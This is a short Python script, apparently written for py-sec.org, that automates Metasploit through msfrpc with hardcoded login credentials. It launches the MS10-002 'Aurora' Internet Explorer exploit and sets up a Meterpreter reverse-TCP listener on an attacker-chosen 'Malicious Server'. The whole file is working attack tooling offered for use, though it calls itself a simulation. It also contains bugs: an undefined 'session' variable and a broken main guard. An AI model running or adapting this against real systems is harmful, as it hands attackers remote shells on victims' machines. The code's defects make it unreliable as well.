#!/usr/bin/python
# written for py-sec.org

import msfrpc, os, optparse, sys
from time import sleep

def auroraExploit(LHOST, LPORT):

	client = msfrpc.Msfrpc({})
	client.login('msf','msf456')
	virtualConsole = client.call('console.create')
	consoleId = virtualConsole['id']
	# Running MS10-002 Exploit
	ms10_002Exploit = """use exploit/windows/browser/ms10_002_aurora
set URIPATH /
set LHOST """ + LHOST + """
set LPORT """ + str(LPORT) + """
exploit -j -z
"""
	print "[+] Exploiting MS10-002 in Internet Explorer ... : "
	print "[+] Malicious Server listening on port: 8080"
	client.call('console.write',[consoleId, ms10_002Exploit])
	res01 = client.call('console.read',[consoleId])	
	result01 = res01['data'].split('\n')
	sleep(30)
	listen = """use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT """ + LPORT + """
set LHOST """+ LHOST +"""
exploit
"""
	print "[+] Setting up Reverse Shell listener on: " + LHOST + ": " + LPORT + "\n"
	client.call('console.write',[consoleId,listen])
	listening = client.call('console.read',[consoleId])
	print "\n" + "[+] Operation Aurora Simulation is done ..." + "\n"

def main():
	parser = optparse.OptionParser(sys.argv[0] +\
        ' -l LHOST -p LPORT ')
	parser.add_option('-p', dest='LPORT', type='string', \
        help ='specify a port of Reverse Shell to listen on')
	parser.add_option('-l', dest='LHOST', type='string', \
        help='Specify a Malicious Server')
	(options, args) = parser.parse_args()
	LHOST=options.LHOST; LPORT=options.LPORT
	if (LHOST == None) and (session == None):
                print parser.usage
                sys.exit(0)
	auroraExploit(LHOST, LPORT)

if __name__ == main():
	main()
